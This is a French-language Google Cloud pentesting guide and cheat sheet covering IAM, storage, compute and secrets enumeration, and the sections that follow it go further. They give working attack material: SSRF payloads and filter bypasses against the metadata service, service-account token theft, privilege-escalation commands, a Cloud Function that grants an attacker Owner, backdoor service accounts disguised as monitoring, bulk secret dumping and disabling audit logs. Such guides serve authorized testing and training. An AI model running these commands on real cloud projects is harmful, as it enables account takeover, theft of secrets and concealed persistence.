# 🟡 GCP Pentesting - Guide Complet

Guide exhaustif pour l'énumération, l'identification de vecteurs et l'exploitation des vulnérabilités sur Google Cloud Platform.

---

## 📖 Concepts Fondamentaux

### Modèle de responsabilité partagée

```
┌──────────────────────────────────────────────────────┐
│               RESPONSABILITÉ CLIENT                  │
│  Données, IAM, config réseau, OS (IaaS), code apps   │
├──────────────────────────────────────────────────────┤
│             RESPONSABILITÉ PARTAGÉE                  │
│         Chiffrement, journalisation, patchs          │
├──────────────────────────────────────────────────────┤
│            RESPONSABILITÉ FOURNISSEUR                │
│     Infrastructure physique, hyperviseur, réseau     │
└──────────────────────────────────────────────────────┘
```

> ⚠️ La majorité des compromissions GCP viennent de **Service Accounts trop permissifs**, de **buckets GCS publics** et de **clés SA exposées dans le code**.

### Les vecteurs principaux GCP

```
IAM overpermissif       → roles/owner, roles/editor accordés trop largement
IMDS / SSRF             → metadata.google.internal → vol de token SA
GCS public              → allUsers/allAuthenticatedUsers sur des buckets
Clés SA exposées        → Fichiers JSON de Service Account dans le code
iam.serviceAccounts.actAs → Impersonate un SA plus privilégié
Cloud Functions         → SA trop permissif + code injectable
Secret Manager          → Secrets accessibles avec les permissions courantes
GKE                     → RBAC Kubernetes, escape de pod, SA node
```

---

## 1️⃣ Concepts Clés GCP

```
Project          → Unité d'organisation et de facturation
IAM              → Contrôle d'accès (members, roles, policies)
Service Account  → Identité pour les applications/ressources (≈ AWS Role)
GCS              → Google Cloud Storage (stockage objet ≈ S3)
GCE              → Google Compute Engine (VMs)
Cloud Functions  → Serverless (≈ Lambda)
Secret Manager   → Stockage de secrets (≈ AWS Secrets Manager)
Cloud Run        → Conteneurs serverless
GKE              → Google Kubernetes Engine
Cloud SQL        → Bases de données managées
```

### Structure IAM GCP

```
Organization
└── Folders
    └── Projects
        └── Resources

IAM Policy = liste de {member: role} sur une ressource
Les permissions se propagent vers le bas (org → folder → project → resource)

Types de members :
  user:email@domain.com
  serviceAccount:sa@project.iam.gserviceaccount.com
  group:group@domain.com
  domain:example.com
  allUsers              ← ⚠️ DANGER : accessible depuis internet sans auth
  allAuthenticatedUsers ← ⚠️ DANGER : accessible à tout compte Google
```

### Rôles prédéfinis importants

```
roles/owner             → Contrôle total du projet → CIBLE
roles/editor            → Tout faire sauf gérer les accès
roles/viewer            → Lecture seule
roles/iam.securityAdmin → Gérer les policies IAM
roles/iam.serviceAccountTokenCreator → Créer des tokens pour n'importe quel SA
roles/iam.serviceAccountUser         → Assumer des SA
```

---

## 2️⃣ Configuration & Authentification

```bash
# Installation CLI gcloud
curl https://sdk.cloud.google.com | bash
exec -l $SHELL
gcloud init

# Login interactif (ouvre un navigateur)
gcloud auth login
gcloud auth application-default login

# Login avec une clé de Service Account (fichier JSON)
gcloud auth activate-service-account \
  --key-file=sa-key.json
export GOOGLE_APPLICATION_CREDENTIALS="/path/to/sa-key.json"

# Identité et contexte courant
gcloud auth list
gcloud config list
gcloud config list account
gcloud config list project

# Lister les projets accessibles
gcloud projects list

# Changer de projet
gcloud config set project PROJECT_ID

# Vérifier ses propres permissions sur un projet
gcloud projects test-iam-permissions PROJECT_ID \
  --permissions=storage.buckets.list,compute.instances.list,iam.serviceAccounts.actAs
```

---

## 3️⃣ Énumération IAM

```bash
# Politique IAM complète du projet courant
gcloud projects get-iam-policy PROJECT_ID

# Format lisible
gcloud projects get-iam-policy PROJECT_ID \
  --format="table(bindings.role,bindings.members)"

# Permissions d'un membre spécifique
gcloud projects get-iam-policy PROJECT_ID \
  --flatten="bindings[].members" \
  --filter="bindings.members:user:email@domain.com" \
  --format="table(bindings.role)"

# Chercher les membres avec roles/owner ou roles/editor
gcloud projects get-iam-policy PROJECT_ID \
  --flatten="bindings[].members" \
  --filter="bindings.role:roles/owner" \
  --format="table(bindings.members)"

# Chercher allUsers (accès public !)
gcloud projects get-iam-policy PROJECT_ID \
  --format=json | grep -i "allusers\|allauthenticated"

# Service Accounts
gcloud iam service-accounts list
gcloud iam service-accounts list \
  --format="table(email,displayName,disabled)"
gcloud iam service-accounts describe SA_EMAIL

# Clés d'un Service Account (clés JSON exposées = compromission directe)
gcloud iam service-accounts keys list --iam-account SA_EMAIL
gcloud iam service-accounts keys list \
  --iam-account SA_EMAIL \
  --filter="keyType=USER_MANAGED"   # Clés créées manuellement (plus dangereuses)

# Rôles disponibles dans le projet
gcloud iam roles list --project PROJECT_ID

# Contenu d'un rôle custom
gcloud iam roles describe ROLE_ID --project PROJECT_ID

# Tester des permissions spécifiques
gcloud projects test-iam-permissions PROJECT_ID \
  --permissions=iam.serviceAccounts.actAs,iam.serviceAccountKeys.create,\
cloudfunctions.functions.create,storage.buckets.setIamPolicy
```

---

## 4️⃣ Énumération GCS (Cloud Storage)

```bash
# Lister les buckets du projet
gsutil ls
gsutil ls -p PROJECT_ID

# Contenu d'un bucket
gsutil ls gs://bucket-name
gsutil ls -la gs://bucket-name       # Avec taille et date
gsutil ls -r gs://bucket-name        # Récursif

# Télécharger un fichier
gsutil cp gs://bucket-name/file.txt ./

# Télécharger tout le bucket
gsutil -m cp -r gs://bucket-name ./

# Vérifier la politique IAM du bucket
gsutil iam get gs://bucket-name
# Chercher allUsers ou allAuthenticatedUsers → bucket public

# ACL du bucket
gsutil acl get gs://bucket-name

# Tester accès sans credentials (allUsers)
gsutil ls gs://bucket-name           # Sans auth
curl https://storage.googleapis.com/bucket-name/
curl https://storage.googleapis.com/storage/v1/b/bucket-name/o

# Versionning activé ? (anciennes versions de fichiers)
gsutil versioning get gs://bucket-name
gsutil ls -a gs://bucket-name        # Afficher toutes les versions

# Lister les buckets publics d'un projet via API
curl "https://storage.googleapis.com/storage/v1/b?project=PROJECT_ID" \
  -H "Authorization: Bearer $(gcloud auth print-access-token)"
```

---

## 5️⃣ Énumération Compute (GCE)

```bash
# Instances VM
gcloud compute instances list
gcloud compute instances list \
  --format="table(name,zone,status,networkInterfaces[0].accessConfigs[0].natIP,serviceAccounts[0].email)"
gcloud compute instances describe INSTANCE_NAME --zone ZONE

# Service Accounts des instances
gcloud compute instances list \
  --format="table(name,zone,serviceAccounts[].email)"

# Instances avec le SA par défaut (souvent trop permissif)
gcloud compute instances list \
  --format=json | grep "compute@developer.gserviceaccount.com"

# Règles firewall
gcloud compute firewall-rules list
# Règles ouvertes à tout internet
gcloud compute firewall-rules list \
  --filter="sourceRanges:0.0.0.0/0" \
  --format="table(name,direction,sourceRanges,allowed)"

# Metadata project-wide (SSH keys, startup scripts)
gcloud compute project-info describe
gcloud compute project-info describe \
  --format="value(commonInstanceMetadata)"

# Metadata d'une instance spécifique (startup script souvent avec secrets)
gcloud compute instances describe INSTANCE_NAME --zone ZONE \
  --format="value(metadata)"

# Disques et snapshots
gcloud compute disks list
gcloud compute snapshots list
```

---

## 6️⃣ Énumération Services

```bash
# Cloud Functions
gcloud functions list
gcloud functions describe FUNCTION_NAME
gcloud functions describe FUNCTION_NAME \
  --format="value(environmentVariables)"  # Variables d'env (secrets !)
gcloud functions describe FUNCTION_NAME \
  --format="value(serviceAccountEmail)"   # SA utilisé

# Cloud Run
gcloud run services list --platform managed
gcloud run services describe SERVICE_NAME --platform managed
gcloud run services describe SERVICE_NAME --platform managed \
  --format="value(spec.template.spec.containers[0].env)"

# Secret Manager
gcloud secrets list
gcloud secrets list --format="table(name,createTime)"
gcloud secrets versions access latest --secret SECRET_NAME
gcloud secrets versions list --secret SECRET_NAME

# Cloud SQL
gcloud sql instances list
gcloud sql instances describe INSTANCE_NAME
gcloud sql instances list \
  --format="table(name,databaseVersion,ipAddresses[0].ipAddress,settings.ipConfiguration.requireSsl)"

# Cloud Run Jobs
gcloud run jobs list --platform managed

# Services GCP activés dans le projet
gcloud services list --enabled
gcloud services list --enabled | grep -E "iam|storage|compute|cloudfunction|secretmanager"

# Logs Cloud Audit (si accès)
gcloud logging read "logName:cloudaudit.googleapis.com" --limit=50
gcloud logging read 'protoPayload.methodName="SetIamPolicy"' --limit=20
```

---

## 7️⃣ IMDS — Vol de Token Service Account

```bash
# Depuis une VM GCE avec un Service Account attaché
# Ou via SSRF sur une app hébergée sur GCP

# Lister les SA disponibles sur l'instance
curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/" \
  -H "Metadata-Flavor: Google"

# Token d'accès du SA default
curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
  -H "Metadata-Flavor: Google"

# Email du SA
curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email" \
  -H "Metadata-Flavor: Google"

# Scopes accordés
curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes" \
  -H "Metadata-Flavor: Google"

# Autres métadonnées utiles
curl "http://metadata.google.internal/computeMetadata/v1/instance/" \
  -H "Metadata-Flavor: Google"
curl "http://metadata.google.internal/computeMetadata/v1/project/project-id" \
  -H "Metadata-Flavor: Google"
# Startup script (peut contenir des secrets)
curl "http://metadata.google.internal/computeMetadata/v1/instance/attributes/startup-script" \
  -H "Metadata-Flavor: Google"

# Utiliser le token
TOKEN=$(curl -s \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
  -H "Metadata-Flavor: Google" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")

# Appeler l'API GCP avec le token
curl -H "Authorization: Bearer $TOKEN" \
  "https://cloudresourcemanager.googleapis.com/v1/projects"

# Lister les buckets GCS
curl -H "Authorization: Bearer $TOKEN" \
  "https://storage.googleapis.com/storage/v1/b?project=PROJECT_ID"
```

### Payloads SSRF vers IMDS GCP

```
# Header obligatoire : Metadata-Flavor: Google
# Contournement si header filtré : via redirect HTTP 301

http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token

# Bypasses de filtres IP
http://metadata.google.internal@attacker.com/          # URL confusion
http://[::ffff:a9fe:a9fe]/computeMetadata/v1/          # IPv6
http://0251.0376.0251.0376/computeMetadata/v1/         # octal
```

---

## 8️⃣ Privilege Escalation IAM

### Paths d'escalade courants

```
iam.serviceAccounts.actAs           → Assumer un SA avec plus de droits
iam.serviceAccountTokenCreator      → Créer des tokens pour n'importe quel SA
iam.serviceAccountKeys.create       → Créer une clé JSON pour un SA admin
iam.roles.update                    → Modifier un rôle custom pour ajouter des permissions
resourcemanager.projects.setIamPolicy → Modifier la policy IAM du projet → s'accorder Owner
cloudfunctions.functions.create
  + iam.serviceAccounts.actAs       → Exécuter du code en tant que SA admin
compute.instances.setServiceAccount → Changer le SA d'une VM
storage.buckets.setIamPolicy        → Rendre un bucket public ou en prendre contrôle
```

### Exploitation

```bash
# Impersonate un SA plus privilégié (si iam.serviceAccounts.actAs)
gcloud auth print-access-token \
  --impersonate-service-account=admin-sa@project.iam.gserviceaccount.com

# Créer une clé JSON pour un SA admin (si iam.serviceAccountKeys.create)
gcloud iam service-accounts keys create backdoor-key.json \
  --iam-account admin-sa@project.iam.gserviceaccount.com

# S'authentifier avec la clé
gcloud auth activate-service-account --key-file=backdoor-key.json

# S'accorder le rôle Owner (si resourcemanager.projects.setIamPolicy)
gcloud projects add-iam-policy-binding PROJECT_ID \
  --member="user:attacker@gmail.com" \
  --role="roles/owner"

# Modifier un rôle custom pour y ajouter des permissions (si iam.roles.update)
gcloud iam roles update CUSTOM_ROLE_ID --project PROJECT_ID \
  --add-permissions=iam.serviceAccounts.actAs,iam.serviceAccountKeys.create
```

### Cloud Functions PrivEsc

```bash
# Si cloudfunctions.functions.create + iam.serviceAccounts.actAs
# Déployer une fonction exécutée avec un SA admin

cat > main.py << 'EOF'
import subprocess, json
def pwn(request):
    # S'accorder le rôle Owner
    result = subprocess.run([
        'gcloud', 'projects', 'add-iam-policy-binding', 'PROJECT_ID',
        '--member=user:attacker@gmail.com', '--role=roles/owner'
    ], capture_output=True, text=True)
    return result.stdout + result.stderr
EOF

cat > requirements.txt << 'EOF'
EOF

gcloud functions deploy privesc \
  --runtime python39 \
  --trigger-http \
  --service-account admin-sa@project.iam.gserviceaccount.com \
  --allow-unauthenticated \
  --source .

# Invoquer la fonction
curl https://REGION-PROJECT_ID.cloudfunctions.net/privesc
```

### Token Creator PrivEsc

```bash
# Si iam.serviceAccountTokenCreator sur un SA admin
# Générer un token pour ce SA via l'API REST

TOKEN=$(gcloud auth print-access-token)
curl -s -X POST \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"scope": ["https://www.googleapis.com/auth/cloud-platform"]}' \
  "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/admin-sa@project.iam.gserviceaccount.com:generateAccessToken" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['accessToken'])"
```

---

## 9️⃣ Post-Exploitation & Persistance

```bash
# Créer un Service Account backdoor avec rôle Owner
gcloud iam service-accounts create monitoring-sa \
  --display-name "Monitoring Service Account"

gcloud projects add-iam-policy-binding PROJECT_ID \
  --member="serviceAccount:monitoring-sa@PROJECT_ID.iam.gserviceaccount.com" \
  --role="roles/owner"

gcloud iam service-accounts keys create backdoor.json \
  --iam-account monitoring-sa@PROJECT_ID.iam.gserviceaccount.com
# → Utiliser backdoor.json pour se connecter plus tard

# Ajouter son compte personnel comme Owner
gcloud projects add-iam-policy-binding PROJECT_ID \
  --member="user:attacker@gmail.com" \
  --role="roles/owner"

# Dump de tous les secrets
gcloud secrets list --format="value(name)" | \
  xargs -I{} gcloud secrets versions access latest --secret {}

# Désactiver les logs d'audit (si droits suffisants)
gcloud projects get-iam-policy PROJECT_ID > policy.json
# Modifier pour supprimer les auditLogConfigs
gcloud projects set-iam-policy PROJECT_ID policy.json

# Créer un bucket backdoor
gsutil mb gs://backup-monitoring-$(date +%s)
gsutil iam ch allUsers:objectViewer gs://backup-monitoring-TIMESTAMP
```

---

## 🔟 Outils GCP

```bash
# ── gcloud (CLI officielle) ────────────────────────────
gcloud auth login
gcloud projects get-iam-policy PROJECT_ID
gcloud secrets versions access latest --secret SECRET_NAME
gsutil ls gs://bucket-name

# ── GCP IAM Privilege Escalation (Rhino Security) ─────
git clone https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation
pip install -r requirements.txt
# Énumérer les permissions disponibles
python3 PrivEscScanner/main.py \
  --project-id PROJECT_ID \
  --service-account-json key.json
# → Liste les paths d'escalade exploitables

# ── GCPBucketBrute (découverte de buckets) ─────────────
git clone https://github.com/RhinoSecurityLabs/GCPBucketBrute
pip install -r requirements.txt
python3 GCPBucketBrute.py -k keyword -o output.txt
python3 GCPBucketBrute.py -k "company-name" -s

# ── ScoutSuite (audit de configuration) ────────────────
pip install scoutsuite
scout gcp --user-account
scout gcp --service-account key.json
# → Rapport HTML dans scoutsuite-report/

# ── gcp_scanner (Google officiel) ─────────────────────
git clone https://github.com/google/gcp_scanner
pip install -r requirements.txt
python3 scanner.py -k key.json -p PROJECT_ID
# → Inventaire complet des ressources et permissions

# ── Prowler (benchmark CIS/NIST) ───────────────────────
pip install prowler
prowler gcp --credentials-file key.json
prowler gcp -c gcp_iam_no_user_granted_permissions_directly

# ── Trufflehog (leak de clés SA dans git/code) ─────────
trufflehog git https://github.com/target/repo
# Détecte les fichiers JSON de Service Account

# ── Gitleaks ───────────────────────────────────────────
gitleaks detect --source . --verbose
gitleaks detect --source . -r report.json
```

---

## 1️⃣1️⃣ Cheatsheet Rapide

```bash
# ═══════════════════════════════
# IDENTITÉ & PERMISSIONS
# ═══════════════════════════════
gcloud auth list                                       # Qui suis-je ?
gcloud config list project                             # Projet courant
gcloud projects get-iam-policy PROJECT_ID              # Policy IAM complète
gcloud projects test-iam-permissions PROJECT_ID \
  --permissions=iam.serviceAccounts.actAs,storage.buckets.list
# Chercher allUsers dans la policy IAM
gcloud projects get-iam-policy PROJECT_ID --format=json | \
  grep -i "allusers\|allauthenticated"

# ═══════════════════════════════
# SERVICE ACCOUNTS
# ═══════════════════════════════
gcloud iam service-accounts list
gcloud iam service-accounts keys list --iam-account SA_EMAIL
gcloud iam service-accounts describe SA_EMAIL

# ═══════════════════════════════
# GCS (STORAGE)
# ═══════════════════════════════
gsutil ls                                              # Mes buckets
gsutil ls gs://BUCKET                                  # Contenu
gsutil iam get gs://BUCKET                             # Politique IAM
gsutil ls gs://BUCKET                                  # Test accès public
curl https://storage.googleapis.com/BUCKET/            # Test sans auth

# ═══════════════════════════════
# SECRETS
# ═══════════════════════════════
gcloud secrets list
gcloud secrets versions access latest --secret SECRET_NAME
gcloud functions describe FUNC \
  --format="value(environmentVariables)"               # Env vars Functions
gcloud run services describe SVC --platform managed \
  --format="value(spec.template.spec.containers[0].env)"

# ═══════════════════════════════
# IMDS (depuis VM GCE / SSRF)
# ═══════════════════════════════
curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
  -H "Metadata-Flavor: Google"
curl "http://metadata.google.internal/computeMetadata/v1/instance/attributes/startup-script" \
  -H "Metadata-Flavor: Google"
curl "http://metadata.google.internal/computeMetadata/v1/project/project-id" \
  -H "Metadata-Flavor: Google"

# ═══════════════════════════════
# PRIVESC
# ═══════════════════════════════
# Impersonate SA admin
gcloud auth print-access-token \
  --impersonate-service-account=admin-sa@project.iam.gserviceaccount.com

# Créer clé pour SA admin
gcloud iam service-accounts keys create key.json \
  --iam-account admin-sa@project.iam.gserviceaccount.com

# S'accorder Owner
gcloud projects add-iam-policy-binding PROJECT_ID \
  --member="user:attacker@gmail.com" --role="roles/owner"

# Scanner les paths d'escalade
python3 PrivEscScanner/main.py --project-id PROJECT_ID --service-account-json key.json

# ═══════════════════════════════
# PERSISTANCE
# ═══════════════════════════════
gcloud iam service-accounts create monitoring-sa
gcloud projects add-iam-policy-binding PROJECT_ID \
  --member="serviceAccount:monitoring-sa@PROJECT.iam.gserviceaccount.com" \
  --role="roles/owner"
gcloud iam service-accounts keys create backdoor.json \
  --iam-account monitoring-sa@PROJECT.iam.gserviceaccount.com

# ═══════════════════════════════
# OUTILS
# ═══════════════════════════════
scout gcp --user-account              # Audit config
python3 PrivEscScanner/main.py        # Chemins d'escalade IAM
python3 GCPBucketBrute.py -k keyword  # Découverte buckets
gitleaks detect --source .            # Leak de clés SA
```

---

## 📚 Ressources

- **HackTricks GCP** : https://cloud.hacktricks.xyz/pentesting-cloud/gcp-security
- **Rhino Security — GCP IAM PrivEsc** : https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation
- **GCPBucketBrute** : https://github.com/RhinoSecurityLabs/GCPBucketBrute
- **gcp_scanner (Google)** : https://github.com/google/gcp_scanner
- **ScoutSuite** : https://github.com/nccgroup/ScoutSuite
- **Prowler** : https://github.com/prowler-cloud/prowler
- **Thunder CTF (labs GCP)** : https://thunder-ctf.cloud
- **GCP Security Foundations** : https://cloud.google.com/security/best-practices
- **PayloadsAllTheThings GCP** : https://github.com/swisskyrepo/PayloadsAllTheThings

---

**Tags:** `#gcp #iam #gcs #gce #serviceaccount #imds #ssrf #privesc #cloudfunctions #secretmanager #scoutsuite #ctf #pentest #cloud`
